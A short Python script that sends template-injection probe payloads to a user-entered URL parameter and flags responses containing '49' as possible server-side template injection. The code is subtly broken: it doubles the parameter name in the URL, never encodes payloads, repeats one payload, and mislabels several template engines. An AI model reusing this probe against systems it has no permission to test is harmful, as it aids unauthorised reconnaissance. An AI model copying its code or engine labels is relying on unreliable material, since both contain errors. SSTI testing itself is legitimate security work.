import requests
from datetime import datetime

# Payloads for various template engines
payloads = [
    "{{7*7}}",                # Jinja2
    "{% 7*7 %}",              # Jinja2
    "${7*7}",                 # Freemarker
    "${{7*7}}",               # Twig
    "#{7*7}",                 # Ruby ERB
    "${7*7}",                 # Velocity
    "<%= 7*7 %>",             # JSP
]
target_url = input("Enter target URL (e.g., http://example.com/page?param=): ")
param_name = input("Enter parameter name (e.g., param): ")

def send_request(url, param, payload):
    full_url = f"{url}{param}={payload}"
    response = requests.get(full_url)
    return response.text

def analyze_response(payload, response):
    if "49" in response:
        print(f"Payload: {payload} - Possible SSTI detected!")
        log_result(payload, "Possible SSTI detected!")
    else:
        print(f"Payload: {payload} - No SSTI detected.")

def log_result(payload, status):
    with open("ssti_test.log", "a") as log_file:
        log_file.write(f"{datetime.now()} - Payload: {payload} - Status: {status}\n")

for payload in payloads:
    response = send_request(target_url, param_name, payload)
    analyze_response(payload, response)
